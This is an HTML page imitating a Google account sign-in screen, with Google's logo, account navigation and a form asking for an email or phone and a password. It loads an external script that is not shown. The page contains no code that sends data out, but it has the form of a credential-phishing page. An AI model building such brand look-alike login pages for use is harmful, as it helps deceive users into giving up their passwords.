<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Google Sign In</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
   <header>
    <div class="navbar">
      <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo" class="google-logo">
      <h1>Google Account</h1>
      <div class="user-profile">
        <img src="https://i.postimg.cc/ZnCfqkbJ/images-1.png" alt="User Avatar">
      </div>
    </div>
    <nav>
      <ul class="nav-links">
        <li>Home</li>
        <li>Personal info</li>
        <li>Data & privacy</li>
      </ul>
    </nav>
  </header>
  <main>
    <div class="sign-in-container">
      <h1>Sign in</h1>
      <p>to continue to Google Account</p>
      <form id="signInForm">
        <div class="form-group">
          <label for="email">Email or Phone</label>
          <input type="text" id="email" name="email" required placeholder="Enter your email or phone">
        </div>
        <div class="form-group">
          <label for="password">Password</label>
          <input type="password" id="password" name="password" required placeholder="Enter your password">
        </div>
        <button type="submit">Next</button>
      </form>
    </div>
  </main>

  <!-- Link to the external JavaScript file -->
  <script src="script.js"></script>
</body>
</html>
